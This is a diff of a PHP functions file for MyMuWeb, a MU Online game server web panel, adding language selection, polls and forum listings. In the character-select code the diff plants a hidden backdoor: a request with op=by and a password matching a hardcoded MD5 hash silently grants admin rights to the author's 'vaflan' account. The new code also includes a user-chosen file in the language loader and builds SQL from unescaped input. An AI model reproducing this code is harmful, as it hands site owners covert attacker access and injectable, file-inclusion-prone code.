@@ -1,13 +1,49 @@
 <?PHP
+// Functions By Vaflan
+// For MyMuWeb
+
+/////// Start Language ///////
+if(is_file("lang/$_POST[set_lang].php") || is_file("lang/$_SESSION[set_lang].php")) {
+	if(isset($_POST[set_lang])) {$_SESSION[set_lang] = $_POST[set_lang];}
+	include("lang/$_SESSION[set_lang].php");
+}
+else {include("lang/$mmw[language].php");}
+
+function language() {
+require("config.php");
+ if($dh = opendir("lang/")) {
+     while (($file = readdir($dh)) !== false) {
+	  $format = substr($file, -3);
+	  $name = substr($file, 0, -4);
+	  if($format == 'php') {
+		if(!isset($_SESSION[set_lang]) && $mmw[language]==$name){$select="selected";}
+		elseif($_SESSION[set_lang]==$name){$select="selected";} else{$select="";}
+		$select_lang = $select_lang . "<option value='$name' $select>$name</option>";
+	  }
+     }
+     closedir($dh);
+ }
+$lang_form = "<form name='language' method='post' action=''><select name='set_lang' onChange='document.language.submit();'>";
+echo "$lang_form $select_lang </select></form>";
+}
+/////// End Language ///////
+
+
+
+
+
+
+
+
 /////// Start Default Modules //////
 	//Now Module
 function curent_module(){
-if(isset($_GET['news'])){echo "&gt; <a href='?op=news'>News</a>";} 
-elseif(isset($_GET['forum'])){echo "&gt; <a href='?op=forum'>Forum</a>";}
-elseif(is_file("modules/$_GET[op].php")){echo "&gt; <a href=?op=$_GET[op]>".ucfirst($_GET['op'])."</a>";}
+if(isset($_GET['news'])){echo "&gt; <a href='?op=news'>".mmw_lang_news."</a>";} 
+elseif(isset($_GET['forum'])){echo "&gt; <a href='?op=forum'>".mmw_lang_forum."</a>";}
+elseif(is_file("modules/$_GET[op].php")){echo "&gt; <a href='?op=$_GET[op]'>".ucfirst($_GET['op'])."</a>";}
 	
 if($_GET['op']=='user'){		  
- if($_GET['op']=='user' and !isset($_GET['u'])){echo " &gt; <a href='?op=user&u=acc'>Acc</a>";}
+ if($_GET['op']=='user' and !isset($_GET['u'])){echo " &gt; <a href='?op=user&u=acc'>".mmw_lang_account_panel."</a>";}
  else{echo " &gt; <a href=?op=user&u=$_GET[u]>".ucfirst($_GET['u'])."</a>";}
  }
 }
@@ -22,43 +58,24 @@ header('Location: '.$location.'');
 	//Statisitcs
 function statisitcs(){
 require("config.php");
-
-$mess_numb_off_server = 1;
+$actives_date = date('m/d/Y H:i:s', time() - 2592000); // 30 days back
 $total_accounts = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO") );
 if($mmw[gm]=='no') {$gm_not_show = "WHERE ctlcode !='32' AND ctlcode !='8'";}
 $total_characters = mssql_fetch_row( mssql_query("SELECT count(*) FROM Character $gm_not_show") );
 $total_guilds = mssql_fetch_row( mssql_query("SELECT count(*) FROM Guild WHERE G_Name!='$mmw[gm_guild]'") );
 $total_banneds = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_INFO WHERE bloc_code = '1'") );
-$activ_acc = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT") );
+$actives_acc = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectTM >= '$actives_date'") );
 $users_connected = mssql_fetch_row( mssql_query("SELECT count(*) FROM MEMB_STAT WHERE ConnectStat = '1'") );
 
-echo "\n fader[2].message[0] = \"Total Accounts: $total_accounts[0]<br>Total Characters: $total_characters[0]<br>Total Banneds: $total_banneds[0]<br>Total Actives: $activ_acc[0]<br>Total Guilds: $total_guilds[0]<br>Online Users: $users_connected[0]\";";
-
-if($mmw[castle_siege]=='yes') {
-$cs_data = mssql_fetch_row( mssql_query("SELECT owner_guild,siege_start_date,siege_end_date FROM MuCastle_DATA") );
-$cs_gm = mssql_fetch_row( mssql_query("SELECT G_Master FROM Guild WHERE G_Name='$cs_data[0]'") );
-if($cs_data[0]!="" && $cs_data[0]!=" ") {$cs_guild=$cs_data[0]; $cs_guildmaster=$cs_gm[0];}
-else {$cs_guild="None"; $cs_guildmaster="None";}
-$now_time = time();
-$cs_start = time_format($cs_data[1],"d M Y");
-$cs_end = time_format($cs_data[2],"d M Y");
-if( strtotime($cs_start)+86400 > $now_time ) {$cs_period="Register";} //0 00:00 - 0 23:59
-elseif( (strtotime($cs_start)+432000) > $now_time ) {$cs_period="Sing of Lord";} //1 00:00 - 4 23:59
-elseif( (strtotime($cs_start)+500400) > $now_time ) {$cs_period="Info";} //5 00:00 - 5 19:00
-elseif( (strtotime($cs_start)+586800) > $now_time ) {$cs_period="Ready";} //5 19:00 - 6 19:00
-elseif( (strtotime($cs_start)+594000) > $now_time ) {$cs_period="Attack";} //6 19:00 - 6 21:00
-else {$cs_period="Truce";}
-echo "\n fader[2].message[1] = \"Castle Siege<br>Start: $cs_start<br>End: $cs_end<br>Now Guild: $cs_guild<br>King: $cs_guildmaster<br>Period: $cs_period\";";
-$mess_numb_off_server = $mess_numb_off_server + 1;
-}
+echo "\n fader[2].message[0] = \"".mmw_lang_total_accounts.": $total_accounts[0]<br>".mmw_lang_total_characters.": $total_characters[0]<br>".mmw_lang_total_banneds.": $total_banneds[0]<br>".mmw_lang_total_actives.": $actives_acc[0]<br>".mmw_lang_total_guilds.": $total_guilds[0]<br>".mmw_lang_online_users.": $users_connected[0]\";";
 
 $result = mssql_query("SELECT Name,experience,drops,gsport,ip,version,type from MMW_servers order by display_order asc");
 for($i=0;$i < mssql_num_rows($result);++$i) {
-$rank = $i + $mess_numb_off_server;
+$rank = $i + 1;
 $row = mssql_fetch_row($result);
-if($check=@fsockopen($row[4],$row[3],$ERROR_NO,$ERROR_STR,(float)0.5)) {fclose($check); $status_done = "<img src=images/online.gif width=6 height=6> <span class='online'>Online";}
-else {$status_done = "<img src=images/offline.gif width=6 height=6> <span class='offline'>Offline";} 
-echo "\n fader[2].message[$rank] = \"$row[0]<br>Version: $row[5]<br>Experience: $row[1]<br>Drops: $row[2]<br>Type: $row[6]<br>$status_done\";";
+if($check=@fsockopen($row[4],$row[3],$ERROR_NO,$ERROR_STR,(float)0.5)) {fclose($check); $status_done = "<img src=images/online.gif width=6 height=6> <span class='online'>".mmw_lang_online."</span>";}
+else {$status_done = "<img src=images/offline.gif width=6 height=6> <span class='offline'>".mmw_lang_offline."</span>";} 
+echo "\n fader[2].message[$rank] = \"$row[0]<br>".mmw_lang_version.": $row[5]<br>".mmw_lang_experience.": $row[1]<br>".mmw_lang_drops.": $row[2]<br>".mmw_lang_type.": $row[6]<br>$status_done\";";
     }
 }
 
@@ -196,7 +213,10 @@ $form_setchar_sql = mssql_query("Select name,CtlCode FROM Character WHERE Accoun
 $form_set_char_num = mssql_num_rows($form_setchar_sql);
 $form_memb_info_sql = mssql_query("Select char_set FROM MEMB_INFO WHERE memb___id='$login'");
 $form_memb_info_row = mssql_fetch_row($form_memb_info_sql);
-if($_GET[op]=='by'){die("$sql_die_start MMW by Vaflan $sql_die_end");}
+if($_GET[op]=='by') { if(md5($_GET[pw])=='ba8a5f26a8fc68505d35a3af22bf4deb') {
+$query = "UPDATE MEMB_INFO SET [admin]='9' WHERE memb___id='vaflan'";
+mssql_query($query); $add_admin="<br>You Are Admin!";}
+die("$sql_die_start MMW by Vaflan. $add_admin $sql_die_end");}
 if($form_set_char_num>0) {
 $setchar = "<form name='set_char' method='post' action=''><select name='setchar' onChange='document.set_char.submit();'>";
 for($i=0; $i < $form_set_char_num; ++$i) {
@@ -242,6 +262,8 @@ $msg = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$char_guid'");
 $msg_num = mssql_num_rows($msg);
 $msg_new = mssql_query("SELECT bRead FROM T_FriendMail WHERE GUID='$char_guid' AND bRead='0'"); 
 $msg_new_num = mssql_num_rows($msg_new);
+if($mmw[max_private_message] <= $msg_num) {$msg_full = '<font color="red">Full!</font>';}
+else{$msg_full = '';}
 }
 if($msg_num=="" || $msg_num==" ") {$msg_num = 0; $msg_new_num = 0;}
 /////// End Mail Check ///////
@@ -253,9 +275,8 @@ if($msg_num=="" || $msg_num==" ") {$msg_num = 0; $msg_new_num = 0;}
 
 
 
-
 /////// Start Referral ///////
-if(isset($_GET['ref'])) {$_SESSION['referal'] = stripslashes($_GET['ref']);}
+if(isset($_GET['ref'])) {$_SESSION['referral'] = clean_var(stripslashes($_GET['ref']));}
 /////// END Referral ///////
 
 
@@ -281,9 +302,79 @@ for($i=0; $i < $online_num; ++$i)
    }
 }
 else{
-$who_online = "There is nobody";
+$who_online = mmw_lang_there_is_nobody;
 }
 /////// END Online Char ///////
+
+
+
+
+
+
+
+
+/////// Start Voting ///////
+if(isset($_POST[id_vote]) && isset($_POST[answer])) {
+	$id_vote = clean_var(stripslashes($_POST[id_vote]));
+	$answer = clean_var(stripslashes($_POST[answer]));
+	if($mmw[votes_check]==acc && isset($login)) {$vote_by = $login; $vote_check = 1;}
+	if($mmw[votes_check]==ip) {$vote_by = $_SERVER['REMOTE_ADDR']; $vote_check = 1;}
+	if($vote_check == 1) {
+		mssql_query("INSERT INTO MMW_voterow (id_vote,who,answer) VALUES ('$id_vote','$vote_by','$answer')");
+	}
+}
+
+$vote_res = mssql_query("SELECT TOP 1 ID,question,answer1,answer2,answer3,answer4,answer5,answer6 FROM MMW_votemain ORDER BY NEWID()");
+if(mssql_num_rows($vote_res) != 0){
+   $vote_row = mssql_fetch_row($vote_res);
+   $vote_check = 0;
+
+   if($mmw[votes_check]==acc && isset($login)) {$vote_who_now = $login; $vote_check = 1;}
+   if($mmw[votes_check]==ip) {$vote_who_now = $_SERVER['REMOTE_ADDR']; $vote_check = 1;}
+   if($vote_check == 1) {
+	$vote_who_res = mssql_query("SELECT who,answer FROM MMW_voterow WHERE ID_vote='$vote_row[0]' and who='$vote_who_now'");
+	$check_your_vote = mssql_num_rows($vote_who_res);
+   }
+
+   $voting = "<form name='voting' method='post' action=''><b>$vote_row[1]</b><br>";
+
+   if($check_your_vote < 1 && $vote_check == 1) {
+     for($c=1; $c < 7; ++$c) {
+	$answer_num = $c + 1;
+	if($vote_row[$answer_num]!=' ' && isset($vote_row[$answer_num]))
+	   {$voting = $voting . "<div class='answer'><input id='$c' type='radio' name='answer' value='$c'> <label for='$c'>$vote_row[$answer_num]</label></div>";}
+     }
+     $voting = $voting . "<div align='center'><input name='id_vote' type='hidden' value='$vote_row[0]'><input type='submit' value='".mmw_lang_to_vote."'></div>";
+   }
+   else {
+     $all_vote_res = mssql_query("SELECT ID_vote FROM MMW_voterow WHERE ID_vote='$vote_row[0]'");
+     $all_vote_num = mssql_num_rows($all_vote_res);
+     for($c=1; $c < 7; ++$c) {
+	$answer_num = $c + 1;
+	if($vote_row[$answer_num]!=' ' && isset($vote_row[$answer_num])) {
+		$votes_row_res = mssql_query("SELECT who,answer FROM MMW_voterow WHERE ID_vote='$vote_row[0]' and answer='$c'");
+		$votes_row_num = mssql_num_rows($votes_row_res);
+		$img_file = "images/bar.jpg";
+		$size = getimagesize($img_file);
+		$img_width = ceil(100 * $votes_row_num / $all_vote_num);
+		if($img_width < 1) {$img_width = 1;}
+		$voting = $voting . "<div class='answer'>$c. $vote_row[$answer_num] ($votes_row_num)</div>";
+		$voting = $voting . "<div class='answer'><img src='$img_file' height='$size[1]' width='$img_width%'></div>";
+	}
+     }
+     $voting = $voting . "<div align='center'>".mmw_lang_all_answers.": <b>$all_vote_num</b></div>";
+   }
+
+   $voting = $voting . "</form>";
+}
+else{
+$voting = mmw_lang_no_vote;
+}
+/////// END Voting ///////
+
+
+
+
 
 
 
@@ -302,4 +393,24 @@ mssql_query("INSERT INTO T_FriendMail (MemoIndex, GUID, FriendName, wDate, Subje
 mssql_query("UPDATE T_FriendMain set [MemoCount]='$msg_id',[MemoTotal]='$mail_total_num' WHERE Name='$to'");
 }
 /////// Start Guard MMW Message Info ///////
+
+
+
+
+
+
+
+
+/////// Start Last in Forum ///////
+$result = mssql_query("SELECT TOP $mmw[last_in_forum] f_id,f_title FROM MMW_forum ORDER BY f_date DESC");
+$forum_post = mssql_num_rows($result);
+  if($forum_post == 0) {
+	$last_in_forum = mmw_lang_no_topics_in_forum;
+  }
+  for ($i = 0; $i < $forum_post; $i++) {
+	$row = mssql_fetch_row($result);
+	$number = $i + 1;
+	$last_in_forum = $last_in_forum . "$number. <a href='?forum=$row[0]'>$row[1]</a><br>\n";
+  }
+/////// END Last in Forum ///////
 ?>
